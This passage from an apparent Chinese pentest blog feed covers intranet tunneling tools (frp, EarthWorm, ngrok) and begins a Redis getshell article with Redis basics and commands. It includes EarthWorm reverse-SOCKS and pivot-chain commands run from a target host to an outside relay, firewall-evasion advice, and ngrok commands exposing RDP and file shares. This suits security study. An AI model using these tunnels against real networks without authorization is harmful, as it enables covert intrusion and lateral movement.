title="常用功能"></a>常用功能</h2><h3 id="统计面板（Dashboard）"><a href="#统计面板（Dashboard）" class="headerlink" title="统计面板（Dashboard）"></a>统计面板（Dashboard）</h3><p>通过浏览器查看 frp 的状态以及代理统计信息展示。</p><p><strong>注：Dashboard 尚未针对大量的 proxy 数据展示做优化，如果出现 Dashboard 访问较慢的情况，请不要启用此功能。</strong></p><p>需要在 frps.ini 中指定 dashboard 服务使用的端口，即可开启此功能：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line"># dashboard 用户名密码，默认都为 admin</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pwd &#x3D; admin</span><br></pre></td></tr></table></figure><p>打开浏览器通过 <code>http://[server_addr]:7500</code> 访问 dashboard 界面，用户名密码默认为 <code>admin</code>。</p><p><img src="https://segmentfault.com/img/bVbDXkk" alt="dashboard"></p><h3 id="加密与压缩"><a href="#加密与压缩" class="headerlink" title="加密与压缩"></a>加密与压缩</h3><p>这两个功能默认是不开启的，需要在 frpc.ini 中通过配置来为指定的代理启用加密与压缩的功能，压缩算法使用 snappy：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>如果公司内网防火墙对外网访问进行了流量识别与屏蔽，例如禁止了 SSH 协议等，通过设置 <code>use_encryption = true</code>，将 frpc 与 frps 之间的通信内容加密传输，将会有效防止流量被拦截。</p><p>如果传输的报文长度较长，通过设置 <code>use_compression = true</code> 对传输内容进行压缩，可以有效减小 frpc 与 frps 之间的网络流量，加快流量转发速度，但是会额外消耗一些 CPU 资源。</p><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h4><p>从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 <code>frpc.ini</code> 的 <code>common</code> 中配置 <code>tls_enable = true</code> 来启用此功能，安全性更高。</p><p>为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。</p><p><strong>注意： 启用此功能后除 xtcp 外，不需要再设置 use_encryption。</strong></p><h3 id="代理限速"><a href="#代理限速" class="headerlink" title="代理限速"></a>代理限速</h3><p>目前支持在客户端的代理配置中设置代理级别的限速，限制单个 proxy 可以占用的带宽。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br><span class="line">bandwidth_limit &#x3D; 1MB</span><br></pre></td></tr></table></figure><p>在代理配置中增加 <code>bandwidth_limit</code> 字段启用此功能，目前仅支持 <code>MB</code> 和 <code>KB</code> 单位。</p><h3 id="范围端口映射"><a href="#范围端口映射" class="headerlink" title="范围端口映射"></a>范围端口映射</h3><p>在 frpc 的配置文件中可以指定映射多个端口，目前只支持 tcp 和 udp 的类型。</p><p>这一功能通过 <code>range:</code> 段落标记来实现，客户端会解析这个标记中的配置，将其拆分成多个 proxy，每一个 proxy 以数字为后缀命名。</p><p>例如要映射本地 6000-6005, 6007 这 6 个端口，主要配置如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[range:test_tcp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 6000-6006,6007</span><br><span class="line">remote_port &#x3D; 6000-6006,6007</span><br></pre></td></tr></table></figure><p>实际连接成功后会创建 8 个 proxy，命名为 <code>test_tcp_0, test_tcp_1 ... test_tcp_7</code>。</p><h1 id="0x03-ew"><a href="#0x03-ew" class="headerlink" title="0x03 ew"></a>0x03 ew</h1><h2 id="3-1-简介"><a href="#3-1-简介" class="headerlink" title="3.1 简介"></a>3.1 简介</h2><blockquote><p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。但是，现在工具已经不更新了。。。</p></blockquote><p><img src="http://image.v0w.top/Blog/2020-09-07-071504.jpg"></p><h2 id="3-2-特点"><a href="#3-2-特点" class="headerlink" title="3.2 特点"></a>3.2 特点</h2><ol><li>轻量级，C语言编写</li><li>可以设置多级代理</li><li>跨平台</li><li>但是只支持Socks5代理</li></ol><h2 id="3-3-使用方法"><a href="#3-3-使用方法" class="headerlink" title="3.3 使用方法"></a>3.3 使用方法</h2><blockquote><p>以下使用方法均摘自：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p></blockquote><p>以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.</p><p><strong>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。</strong></p><h3 id="1-正向-SOCKS-v5-服务器"><a href="#1-正向-SOCKS-v5-服务器" class="headerlink" title="1. 正向 SOCKS v5 服务器"></a>1. 正向 SOCKS v5 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure><h3 id="2-反弹-SOCKS-v5-服务器"><a href="#2-反弹-SOCKS-v5-服务器" class="headerlink" title="2. 反弹 SOCKS v5 服务器"></a>2. 反弹 SOCKS v5 服务器</h3><p>这个操作具体分两步：<br>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rcsocks -l 1080 -e 8888 </span><br></pre></td></tr></table></figure><p>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rssocks -d 1.1.1.1 -e 8888 </span><br></pre></td></tr></table></figure><p>成功。</p><h3 id="3-多级级联"><a href="#3-多级级联" class="headerlink" title="3. 多级级联"></a>3. 多级级联</h3><p>工具中自带的三条端口转发指令， 它们的参数格式分别为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s lcx_listen -l  1080   -e 8888  </span><br><span class="line">$ .&#x2F;ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999  </span><br><span class="line">$ .&#x2F;ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999</span><br></pre></td></tr></table></figure><p>通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。 首先提供两个“二级级联”本地SOCKS测试样例：</p><p>a) <code>lcx_tran</code> 的用法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s ssocksd  -l 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure><p>b) <code>lcx_listen</code>、<code>lcx_slave</code> 的用法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ .&#x2F;ew -s ssocksd    -l 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure><p>再提供一个“三级级联”的本地SOCKS测试用例以供参考</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rcsocks -l 1080 -e 8888 </span><br><span class="line">$ .&#x2F;ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999  </span><br><span class="line">$ .&#x2F;ew -s lcx_listen -l 9999 -e 7777  </span><br><span class="line">$ .&#x2F;ew -s rssocks -d 127.0.0.1 -e 7777</span><br></pre></td></tr></table></figure><p>数据流向: <code>SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</code></p><h1 id="0x04-ngrok"><a href="#0x04-ngrok" class="headerlink" title="0x04 ngrok"></a>0x04 ngrok</h1><h2 id="4-1-简介"><a href="#4-1-简介" class="headerlink" title="4.1 简介"></a>4.1 简介</h2><blockquote><p>ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试。</p></blockquote><h2 id="4-2-特点"><a href="#4-2-特点" class="headerlink" title="4.2 特点"></a>4.2 特点</h2><ol><li>官方维护，一般较为稳定</li><li>跨平台，闭源</li><li>有流量记录和重发功能</li></ol><h2 id="4-3-使用方法"><a href="#4-3-使用方法" class="headerlink" title="4.3 使用方法"></a>4.3 使用方法</h2><ol><li>进入ngrok官网（<a href="https://link.zhihu.com/?target=https://ngrok.com/">https://ngrok.com/</a>），注册ngrok账号并下载ngrok；</li><li>根据官网给定的授权码，运行如下授权命令；</li><li><code>./ngrok authtoken 1hAotxhmORtzCYvUc3BsxDBPh1H_******************</code></li><li><code>./ngrok http 80</code>即可将机器的80端口http服务暴露到公网，并且会提供一个公网域名。</li></ol><p><img src="http://image.v0w.top/Blog/2020-09-07-074519.jpg"></p><p>可以通过官网的UI界面查看数据包和流量等等（但是要付费==、）</p><p><img src="http://image.v0w.top/Blog/2020-09-07-074719.jpg"></p><p>还可以通过一些命令将内网的文件和其他TCP服务 暴露到公网中。</p><p><strong>有授权的设置文件共享</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ngrok http -auth&#x3D;&quot;user:password&quot; file:&#x2F;&#x2F;&#x2F;Users&#x2F;alan&#x2F;share</span><br></pre></td></tr></table></figure><p><strong>无授权的设置文件共享</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ngrok http &quot;file:&#x2F;&#x2F;&#x2F;C:\Users\alan\Public Folder&quot;</span><br></pre></td></tr></table></figure><p><strong>将主机的3389的TCP端口暴露到公网</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ngrok tcp 3389</span><br></pre></td></tr></table></figure><p>更多使用方法参考：<a href="https://ngrok.com/docs">https://ngrok.com/docs</a></p><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/7701">内网渗透之内网穿透</a></li><li><a href="https://segmentfault.com/a/1190000021876836">开源内网穿透工具 frp 简单使用教程</a></li><li><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文以渗透的视角，总结几种个人常用的内网穿透，内网代理工具，介绍其简单原理和使用方法。&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://v0w.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="http://v0w.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="内网穿透" scheme="http://v0w.top/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Redis与getshell</title>
    <link href="http://v0w.top/2020/08/05/Redis-getshell/"/>
    <id>http://v0w.top/2020/08/05/Redis-getshell/</id>
    <published>2020-08-04T16:00:00.000Z</published>
    <updated>2020-08-31T01:35:34.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文主要介绍redis技术是什么，有什么优势，有什么缺点。接着会从安全渗透的角度，剖析其存在的安全隐患，四种getshell的利用方式和防护策略。</p><h1 id="0x01-Redis简介"><a href="#0x01-Redis简介" class="headerlink" title="0x01 Redis简介"></a>0x01 Redis简介</h1><h2 id="1-1-Redis为什么诞生"><a href="#1-1-Redis为什么诞生" class="headerlink" title="1.1 Redis为什么诞生"></a>1.1 Redis为什么诞生</h2><p>首先，Redis是NoSQL的典型案例之一。那么为什么SQL（关系型数据库）用的好好的，突然出现一个NoSQL呢？</p><p>在Web应用发展的初期，那时关系型数据库受到了较为广泛的关注和应用，原因是因为那时候Web站点基本上访问和并发不高、交互也较少。而在后来，随着访问量的提升，使用关系型数据库的Web站点多多少少都开始在性能上出现了一些瓶颈，而瓶颈的源头一般是在磁盘的I/O上。而随着互联网技术的进一步发展，各种类型的应用层出不穷，这导致在当今云计算、大数据盛行的时代，对性能有了更多的需求，主要体现在以下四个方面：</p><ol><li>低延迟的读写速度：应用快速地反应能极大地提升用户的满意度</li><li>支撑海量的数据和流量：对于搜索这样大型应用而言，需要利用PB级别的数据和能应对百万级的流量</li><li>大规模集群的管理：系统管理员希望分布式应用能更简单的部署和管理</li><li>庞大运营成本的考量：IT部门希望在硬件成本、软件成本和人力成本能够有大幅度地降低</li></ol><p>为了克服这一问题，NoSQL应运而生，它同时具备了高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。</p><h2 id="1-2-Redis是什么"><a href="#1-2-Redis是什么" class="headerlink" title="1.2 Redis是什么"></a>1.2 Redis是什么</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：</p><ul><li>基于内存运行，性能高效</li><li>支持分布式，理论上可以无限扩展</li><li>key-value存储系统</li><li>开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</li></ul><p>相比于其他数据库类型，Redis具备的特点是：</p><ul><li>C/S通讯模型</li><li>单进程单线程模型</li><li>丰富的数据类型</li><li>操作具有原子性</li><li>持久化</li><li>高并发读写</li><li>支持lua脚本</li></ul><p>哪些大厂在使用Redis？</p><ul><li>github</li><li>twitter</li><li>微博</li><li>Stack Overflow</li><li>阿里巴巴</li><li>百度</li><li>美团</li><li>搜狐</li></ul><h2 id="1-3-Redis应用场景"><a href="#1-3-Redis应用场景" class="headerlink" title="1.3 Redis应用场景"></a>1.3 Redis应用场景</h2><p>Redis 的应用场景包括：缓存系统（“热点”数据：高频读、低频写）、计数器、消息队列系统、排行榜、社交网络和实时系统。</p><h1 id="0x02-Redis基础知识"><a href="#0x02-Redis基础知识" class="headerlink" title="0x02 Redis基础知识"></a>0x02 Redis基础知识</h1><h2 id="2-1-Redis的数据类型"><a href="#2-1-Redis的数据类型" class="headerlink" title="2.1 Redis的数据类型"></a>2.1 Redis的数据类型</h2><p>五种自有数据类型：String类型、哈希类型、列表类型、集合类型和顺序集合类型。</p><h3 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h3><p>不仅能够存储字符串、还能存储图片、视频等多种类型, 最大长度支持512M。</p><p>对每种数据类型，Redis都提供了丰富的操作命令，如：</p><ul><li>GET/MGET</li><li>SET/SETEX/MSET/MSETNX</li><li>INCR/DECR</li><li>GETSET</li><li>DEL</li></ul><h3 id="哈希类型hash"><a href="#哈希类型hash" class="headerlink" title="哈希类型hash"></a>哈希类型hash</h3><p>该类型是由field和关联的value组成的map。其中，field和value都是字符串类型的。</p><p>Hash的操作命令如下：</p><ul><li>HGET/HMGET/HGETALL</li><li>HSET/HMSET/HSETNX</li><li>HEXISTS/HLEN</li><li>HKEYS/HDEL</li><li>HVALS</li></ul><h3 id="列表类型list："><a href="#列表类型list：" class="headerlink" title="列表类型list："></a>列表类型list：</h3><p>该类型是一个插入顺序排序的字符串元素集合, 基于双链表实现。</p><p>List的操作命令如下：</p><ul><li>LPUSH/LPUSHX/LPOP/RPUSH/RPUSHX/RPOP/LINSERT/LSET</li><li>LINDEX/LRANGE</li><li>LLEN/LTRIM</li></ul><h3 id="集合类型set："><a href="#集合类型set：" class="headerlink" title="集合类型set："></a>集合类型set：</h3><p>Set类型是一种无顺序集合, 它和List类型最大的区别是：集合中的元素没有顺序, 且元素是唯一的。</p><p>Set类型的底层是通过哈希表实现的，其操作命令为：</p><ul><li>SADD/SPOP/SMOVE/SCARD</li><li>SINTER/SDIFF/SDIFFSTORE/SUNION</li></ul><p>Set类型主要应用于：在某些场景，如社交场景中，通过交集、并集和差集运算，通过Set类型可以非常方便地查找共同好友、共同关注和共同偏好等社交关系。</p><h2 id="2-2-Redis特性"><a href="#2-2-Redis特性" class="headerlink" title="2.2 Redis特性"></a>2.2 Redis特性</h2><h3 id="Redis特性1：事务"><a href="#Redis特性1：事务" class="headerlink" title="Redis特性1：事务"></a>Redis特性1：事务</h3><ul><li>命令序列化，按顺序执行</li><li>原子性</li><li>三阶段: 开始事务 - 命令入队 - 执行事务</li><li>命令：MULTI/EXEC/DISCARD</li></ul><h3 id="Redis特性2：发布订阅-Pub-Sub"><a href="#Redis特性2：发布订阅-Pub-Sub" class="headerlink" title="Redis特性2：发布订阅(Pub/Sub)"></a>Redis特性2：发布订阅(Pub/Sub)</h3><ul><li>Pub/sub是一种消息通讯模式</li><li>Pub发送消息, Sub接受消息</li><li>Redis客户端可以订阅任意数量的频道</li><li>“fire and forgot”, 发送即遗忘</li><li>命令：Publish/Subscribe/Psubscribe/UnSub</li></ul><p>　　<img src="http://image.v0w.top/Blog/2020-08-09-092255.png"></p><h3 id="Redis特性3：Stream"><a href="#Redis特性3：Stream" class="headerlink" title="Redis特性3：Stream"></a>Redis特性3：Stream</h3><ul><li>Redis 5.0新增</li><li>等待消费</li><li>消费组(组内竞争)</li><li>消费历史数据</li><li>FIFO</li></ul><p><img src="http://image.v0w.top/Blog/2020-08-09-092350.jpg"></p><h2 id="2-3-Redis的命令"><a href="#2-3-Redis的命令" class="headerlink" title="2.3 Redis的命令"></a>2.3 Redis的命令</h2><p>最详细的命令还是要参考手册</p><ul><li><a href="https://www.redis.net.cn/order/">https://www.redis.net.cn/order/</a></li><li><a href="http://redisdoc.com/">http://redisdoc.com/</a></li><li><a href="http://redisguide.com/">http://redisguide.com/</a></li></ul><h3 id="2-3-1-Redis连接"><a href="#2-3-1-Redis连接" class="headerlink" title="2.3.1 Redis连接"></a>2.3.1 Redis连接</h3><p><strong>本地连接</strong></p><p>确定本地redis服务启动后。启动 redis 客户端，打开终端并输入命令 redis-cli。该命令会连接本地的 redis 服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-server# 启动redis服务</span><br><span class="line"></span><br><span class="line"> .&#x2F;redis-cli# 启动redis客户端，连接本地服务</span><br><span class="line">127.0.0.1:6379&gt; PING# 测试redis的连通性</span><br><span class="line">PONG</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>远程连接</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ redis-cli -h host -p port -a password</span><br></pre></td></tr></table></figure><h3 id="2-3-2-获取Redis信息"><a href="#2-3-2-获取Redis信息" class="headerlink" title="2.3.2 获取Redis信息"></a>2.3.2 获取Redis信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO# 查看信息</span><br><span class="line"># Server</span><br><span class="line">redis_version:6.0.6</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">KEYS *# 看所有键</span><br><span class="line">1) &quot;key&quot;</span><br><span class="line">2) &quot;key-with-expire-time&quot;</span><br><span class="line"></span><br><span class="line">flushall# 删除所有数据库内容</span><br><span class="line"></span><br><span class="line">flushdb# 刷新数据库</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-3-String-类型命令"><a href="#2-3-3-String-类型命令" class="headerlink" title="2.3.3 String 类型命令"></a>2.3.3 String 类型命令</h3><p>String 介绍稍微详细一点，其他的也是类似的，所以就简单介绍。</p><p><strong>SET 系列</strong></p><ol><li><p><code>SET key value [EX seconds] [PX milliseconds] [NX|XX]</code> </p><p>将字符串值 <code>value</code> 关联到 <code>key</code> 。</p><p>如果 <code>key</code> 已经持有其他值， <code>SET</code> 就覆写旧值， 无视类型。</p></li><li><p><code>SETNX key value</code></p><p>只在键 <code>key</code> 不存在的情况下， 将键 <code>key</code> 的值设置为 <code>value</code> 。</p><p>若键 <code>key</code> 已经存在， 则 <code>SETNX</code> 命令不做任何动作。</p><p><code>SETNX</code> 是『SET if Not eXists』(如果不存在，则 SET)的简写。</p></li><li><p><code>SETEX key seconds value</code></p><p>将键 <code>key</code> 的值设置为 <code>value</code> ， 并将键 <code>key</code> 的生存时间设置为 <code>seconds</code> 秒钟。</p><p>如果键 <code>key</code> 已经存在， 那么 <code>SETEX</code> 命令将覆盖已有的值。</p></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对不存在的键进行设置：</span><br><span class="line">redis&gt; SET key &quot;value&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key</span><br><span class="line">&quot;value&quot;</span><br><span class="line"></span><br><span class="line">对已存在的键进行设置：</span><br><span class="line">redis&gt; SET key &quot;new-value&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key</span><br><span class="line">&quot;new-value&quot;</span><br><span class="line"></span><br><span class="line">使用 EX 选项：将键的过期时间设置为 seconds 秒。</span><br><span class="line">redis&gt; SET key-with-expire-time &quot;hello&quot; EX 10086</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key-with-expire-time</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">redis&gt; TTL key-with-expire-time</span><br><span class="line">(integer) 10069</span><br><span class="line"></span><br><span class="line">使用 PX 选项：将键的过期时间设置为 milliseconds 毫秒。</span><br><span class="line">redis&gt; SET key-with-pexpire-time &quot;moto&quot; PX 123321</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key-with-pexpire-time</span><br><span class="line">&quot;moto&quot;</span><br><span class="line">redis&gt; PTTL key-with-pexpire-time</span><br><span class="line">(integer) 111939</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 NX 选项：只在键不存在时， 才对键进行设置操作</span><br><span class="line">redis&gt; SET not-exists-key &quot;value&quot; NX</span><br><span class="line">OK      # 键不存在，设置成功</span><br><span class="line">redis&gt; GET not-exists-key</span><br><span class="line">&quot;value&quot;</span><br><span class="line">redis&gt; SET not-exists-key &quot;new-value&quot; NX</span><br><span class="line">(nil)   # 键已经存在，设置失败</span><br><span class="line">redis&gt; GEt not-exists-key</span><br><span class="line">&quot;value&quot; # 维持原值不变</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 XX 选项：只在键已经存在时， 才对键进行设置操作</span><br><span class="line">redis&gt; EXISTS exists-key</span><br><span class="line">(integer) 0</span><br><span class="line">redis&gt; SET exists-key &quot;value&quot; XX</span><br><span class="line">(nil)   # 因为键不存在，设置失败</span><br><span class="line">redis&gt; SET exists-key &quot;value&quot;</span><br><span class="line">OK      # 先给键设置一个值</span><br><span class="line">redis&gt; SET exists-key &quot;new-value&quot; XX</span><br><span class="line">OK      # 设置新值成功</span><br><span class="line">redis&gt; GET exists-key</span><br><span class="line">&quot;new-value&quot;</span><br></pre></td></tr></table></figure><p><strong>GET系列</strong></p><p><code>GET key</code>: 如果键 <code>key</code> 不存在， 那么返回特殊值 <code>nil</code> ； 否则， 返回键 <code>key</code> 的值。</p><p>如果键 <code>key</code> 的值并非字符串类型， 那么返回一个错误， 因为 <code>GET</code> 命令只能用于字符串值。</p><p><code>GETSET key value</code>: 将键 <code>key</code> 的值设为 <code>value</code> ， 并返回键 <code>key</code> 在被设置之前的旧值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edis&gt; GETSET db mongodb    # 没有旧值，返回 nil</span><br><span class="line">(nil)</span><br><span class="line"></span><br><span class="line">redis&gt; GET db</span><br><span class="line">&quot;mongodb&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; GETSET db redis      # 返回旧值 mongodb</span><br><span class="line">&quot;mongodb&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; GET db</span><br><span class="line">&quot;redis&quot;</span><br></pre></td></tr></table></figure><p><strong>APPEND key value</strong></p><p>如果键 <code>key</code> 已经存在并且它的值是一个字符串， <code>APPEND</code> 命令将把 <code>value</code> 追加到键 <code>key</code> 现有值的末尾。</p><p>如果 <code>key</code> 不存在， <code>APPEND</code> 就简单地将键 <code>key</code> 的值设为 <code>value</code> ， 就像执行 <code>SET key value</code> 一样。</p><p>追加 <code>value</code> 之后， 返回键 <code>key</code> 的值的长度。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对不存在的 key 执行 APPEND ：</span><br><span class="line"></span><br><span class="line">redis&gt; EXISTS myphone               # 确保 myphone 不存在</span><br><span class="line">(integer) 0</span><br><span class="line">redis&gt; APPEND myphone &quot;nokia&quot;       # 对不存在的 key 进行 APPEND ，等同于 SET myphone &quot;nokia&quot;</span><br><span class="line">(integer) 5                         # 字符长度</span><br><span class="line"></span><br><span class="line">对已存在的字符串进行 APPEND ：</span><br><span class="line"></span><br><span class="line">redis&gt; APPEND myphone &quot; - 1110&quot;     # 长度从 5 个字符增加到 12 个字符</span><br><span class="line">(integer) 12</span><br><span class="line">redis&gt; GET myphone</span><br><span class="line">&quot;nokia - 1110&quot;</span><br></pre></td></tr></table></figure><p><strong>STRLEN key</strong></p><p>返回键 <code>key</code> 储存的字符串值的长度。</p><p>获取字符串值的长度：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET mykey &quot;Hello world&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; STRLEN mykey</span><br><span class="line">(integer) 11</span><br></pre></td></tr></table></figure><p>不存在的键的长度为 <code>0</code> ：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; STRLEN nonex</span><br></pre></td></tr></table></figure><p><strong>APPEND key value</strong></p><p>如果键 <code>key</code> 已经存在并且它的值是一个字符串， <code>APPEND</code> 命令将把 <code>value</code> 追加到键 <code>key</code> 现有值的末尾。</p><p>如果 <code>key</code> 不存在， <code>APPEND</code> 就简单地将键 <code>key</code> 的值设为 <code>value</code> ， 就像执行 <code>SET key value</code> 一样。</p><p><strong>SETRANGE key offset value</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET greeting &quot;hello world&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; SETRANGE greeting 6 &quot;Redis&quot;</span><br><span class="line">(integer) 11</span><br><span class="line"></span><br><span class="line">redis&gt; GET greeting</span><br><span class="line">&quot;hello Redis&quot;</span><br></pre></td></tr></table></figure><p><strong>GETRANGE key start end</strong></p><p>返回键 <code>key</code> 储存的字符串值的指定部分， 字符串的截取范围由 <code>start</code> 和 <code>end</code> 两个偏移量决定 (包括 <code>start</code> 和 <code>end</code> 在内)。</p><p>负数偏移量表示从字符串的末尾开始计数， <code>-1</code> 表示最后一个字符， <code>-2</code> 表示倒数第二个字符， 以此类推。</p><p><code>GETRANGE</code> 通过保证子字符串的值域(range)不超过实际字符串的值域来处理超出范围的值域请求。</p><p>类似SubStr命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET greeting &quot;hello, my friend&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GETRANGE greeting 0 4          # 返回索引0-4的字符，包括4。</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">redis&gt; GETRANGE greeting -1 -5        # 不支持回绕操作</span><br><span class="line">&quot;&quot;</span><br><span class="line">redis&gt; GETRANGE greeting -3 -1        # 负数索引</span><br><span class="line">&quot;end&quot;</span><br><span class="line">redis&gt; GETRANGE greeting 0 -1         # 从第一个到最后一个</span><br><span class="line">&quot;hello, my friend&quot;</span><br><span class="line">redis&gt; GETRANGE greeting 0 1008611    # 值域范围不超过实际字符串，超过部分自动被符略</span><br><span class="line">&quot;hello, my friend&quot;</span><br></pre></td></tr></table></figure><p><strong>MSET key value [key value …]</strong></p><p>同时对多个键进行设置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; MSET date &quot;2012.3.30&quot; time &quot;11:00 a.m.&quot; weather &quot;sunny&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET date time weather</span><br><span class="line">1) &quot;2012.3.30&quot;</span><br><span class="line">2) &quot;11:00 a.m.&quot;</span><br><span class="line">3) &quot;sunny&quot;</span><br></pre></td></tr></table></figure><p>覆盖已有的值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; MGET k1 k2</span><br><span class="line">1) &quot;hello&quot;</span><br><span class="line">2) &quot;world&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; MSET k1 &quot;good&quot; k2 &quot;bye&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET k1 k2</span><br><span class="line">1) &quot;good&quot;</span><br><span class="line">2) &quot;bye&quot;</span><br></pre></td></tr></table></figure><p><strong>MGET key [key …]</strong></p><p>返回给定的一个或多个字符串键的值。</p><p>如果给定的字符串键里面， 有某个键不存在， 那么这个键的值将以特殊值 